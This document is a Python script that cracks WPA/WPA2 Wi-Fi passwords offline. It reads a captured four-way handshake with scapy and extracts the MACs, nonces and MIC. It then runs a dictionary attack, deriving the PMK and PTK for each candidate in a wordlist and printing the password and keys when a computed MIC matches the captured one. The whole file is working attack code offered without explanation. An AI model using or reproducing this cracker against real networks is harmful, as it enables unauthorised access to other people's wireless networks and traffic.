from scapy.all import *
import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5

pkts = rdpcap('psk-01.cap')
four_way_handshake = []
for pkt in pkts:
	if pkt.haslayer(EAPOL):
		four_way_handshake.append(pkt)


SSID = "NAME_OF_SSID"
AP_MAC = None
STA_MAC = None
AP_NONCE = None
STA_NONCE = None
MIC1 = None
EAPOL_FRAMES_ZEROED_MIC = []

def CollectData():
	global AP_MAC, STA_MAC,AP_NONCE, STA_NONCE ,EAPOL_FRAMES_ZEROED_MIC, MIC1
	AP_MAC = a2b_hex(four_way_handshake[0]["Dot11"].addr2.replace(':' , ''))
	STA_MAC = a2b_hex(four_way_handshake[0]["Dot11"].addr1.replace(':' , ''))
	AP_NONCE = four_way_handshake[0]["Raw"].load[13:45]
	STA_NONCE = four_way_handshake[1]["Raw"].load[13:45]
	MIC1 = four_way_handshake[1]["Raw"].load[77:93]
	print(f"Found MAC address of AP: {AP_MAC}")
	print(f"Found MAC address of STATION: {STA_MAC}")
	print(f"Found Station Nonce: {STA_NONCE.hex()}")
	print(f"Found AP Nonce: {AP_NONCE.hex()}")
	print(f"Found MIC: {MIC1.hex()}")
	for pkt in four_way_handshake[1:]:
		EAPOL_FRAMES_ZEROED_MIC.append(raw(pkt["EAPOL"])[:81] +
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
                raw(pkt["EAPOL"])[97:])


#Pseudo-random function for generation of
#the pairwise transient key (PTK)
#key:       The PMK
#A:         b'Pairwise key expansion'
#B:         The apMac, cliMac, aNonce, and sNonce concatenated
#           like mac1 mac2 nonce1 nonce2
#           such that mac1 < mac2 and nonce1 < nonce2
#return:    The ptk
def PRF(key, A, B):
	#Number of bytes in the PTK
	nByte = 64
	i = 0
	R = b''
	#Each iteration produces 160-bit value and 512 bits are required
	while(i <= ((nByte * 8 + 159) / 160)):
		hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
		R = R + hmacsha1.digest()
		i += 1
	return R[0:nByte]


def GetParamsForPrf(ap_nonce, station_nonce, ap_mac, station_mac):
	A = b"Pairwise key expansion"
	B = min(ap_mac, station_mac) + max(ap_mac, station_mac) + min(ap_nonce, station_nonce) + max(ap_nonce, station_nonce)
	return (A, B)

def GenerateMics(password, ssid, A, B, data, wpa = False):
	pmk = pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
	ptk = PRF(pmk, A, B)
	hmacFunc = md5 if wpa else sha1
	mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
	return (mics, ptk, pmk)




CollectData()
A, B = GetParamsForPrf(AP_NONCE, STA_NONCE, AP_MAC, STA_MAC)

tic = time.perf_counter()
i = 0
with open('passwords.txt') as f:
	for password in f:
		i += 1
		mics, ptk, pmk = GenerateMics(password[:-1], SSID, A, B, EAPOL_FRAMES_ZEROED_MIC)
		
		if b2a_hex(mics[0]).decode()[:-8] == MIC1.hex():
			print("FOUND PASSWORD!")
			print(password)
			print(f"PMK is: {b2a_hex(pmk).decode()}")
			print(f"PTK is: {b2a_hex(ptk).decode()}")
			break
		if i % 10000 == 0:
			print(f"Currently in the {i}th line number")

toc = time.perf_counter()
print(f"Ran for {toc - tic:0.4f} seconds")














